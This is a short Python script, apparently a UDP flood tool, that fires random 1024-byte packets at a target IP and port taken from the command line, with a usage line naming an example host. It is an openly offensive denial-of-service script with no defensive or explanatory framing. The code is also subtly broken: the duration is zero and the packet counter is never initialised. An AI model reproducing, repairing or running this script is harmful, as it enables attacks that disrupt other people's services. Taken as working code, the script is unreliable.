import socket
import random
import time
import sys

# Usage
# python3 udp_flood.py <ip> <port>
# example: python3 udp_flood.py test.pwnu.nl 80

# Parameters
ip = sys.argv[1]
port = int(sys.argv[2])
duration = 0
timeout = time.time() + duration
packet_size = 1024

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send packets
while True:
    if time.time() > timeout:
        break
    else:
        pass
    data = random._urandom(packet_size)
    sock.sendto(data, (ip, port))
    sent = sent + 1
    print(sent, ip, port)
